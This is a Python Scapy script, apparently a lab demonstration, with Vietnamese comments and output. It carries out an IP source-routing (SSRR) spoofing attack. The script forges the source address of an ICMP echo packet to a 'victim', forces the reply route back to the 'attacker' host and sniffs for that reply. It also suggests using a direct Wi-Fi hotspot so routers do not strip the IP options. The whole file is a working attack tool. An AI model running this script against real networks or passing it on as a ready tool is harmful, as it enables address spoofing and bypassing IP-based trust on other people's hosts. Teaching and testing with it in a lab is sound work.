#!/usr/bin/env python3
# ssrr.py - Gui goi tin ICMP Echo kem tuy chon SSRR (Strict Source Route)
# Ho tro: 2 may that (Wi-Fi) hoac Network Namespace
import sys
import time
from scapy.all import *

victim_ip   = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
attacker_ip = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.1"
iface       = sys.argv[3] if len(sys.argv) > 3 else (conf.iface or "wlan0")

# Neu nguoi dung muon chi dinh IP gia mao
if len(sys.argv) > 4:
    spoof_ip = sys.argv[4]
else:
    if victim_ip.startswith("192.168."):
        prefix = ".".join(victim_ip.split(".")[:3])
        spoof_ip = f"{prefix}.222"
    else:
        spoof_ip = "10.0.0.77"

print("==================================================================")
print("[*] TAN CONG DINH TUYEN TAI NGUON (IP SOURCE ROUTING - SSRR)")
print("==================================================================")
print(f"[*] IP nguon GIA MAO:            {spoof_ip}")
print(f"[*] IP nan nhan (Victim):        {victim_ip}")
print(f"[*] IP ke tan cong (Attacker):   {attacker_ip}")
print(f"[*] Card mang su dung:           {iface}")
print(f"[*] SSRR ep lo trinh quay ve:    {attacker_ip} -> {victim_ip}")
print("==================================================================")

# Goi tin SSRR chuan: Dat pointer = 8 de Victim nhan dien minh la chang den,
# va dao nguoc lo trinh (reverse route) de gui phan hoi ve Attacker
pkt = IP(src=spoof_ip, dst=victim_ip,
         options=[IPOption_SSRR(routers=[attacker_ip, victim_ip], pointer=8)]) \
      /ICMP(id=0x4242)/b"src-routed-probe-by-attacker"

# Bat may nghe len tren card mang chi bat goi Echo Reply (type 0) tra ve cho attacker_ip
sniffer = AsyncSniffer(iface=iface, timeout=4, count=1,
                       filter=f"icmp and icmp[icmptype] == 0 and dst host {attacker_ip}")
sniffer.start()
time.sleep(0.3)

print(f"\n[*] Dang gui goi tin ICMP co tuy chon SSRR toi {victim_ip}...")
send(pkt, iface=iface, verbose=0)

sniffer.join()
if sniffer.results:
    reply = sniffer.results[0]
    print(f"\n[+] TAN CONG THANH CONG!")
    print(f"    - Attacker ({attacker_ip}) da hung duoc goi tin tu: {reply[IP].src}")
    print(f"    - Dich cua goi phan hoi: {reply[IP].dst}")
    print(f"\n[=>] KET LUAN:")
    print(f"     Mac du goi gui di mang IP gia mao la {spoof_ip}, nhung nho tuy chon SSRR,")
    print(f"     Victim da dao nguoc lo trinh va gui phan hoi ve dung tay Attacker ({attacker_ip})!")
    print("     Day chinh la nguy co cua Source Routing: Cho phep gia mao IP 2 chieu!")
else:
    print(f"\n[-] Attacker ({attacker_ip}) KHONG nhan duoc goi phan hoi nao.")
    print("    [=>] Giai thich: Victim da loai bo goi tin hoac Router Wi-Fi da loc bo IP Options.")
    print("         (Neu muon thu nghiem khong bi Router chan, hay dung che do Wi-Fi Hotspot truc tiep!)")
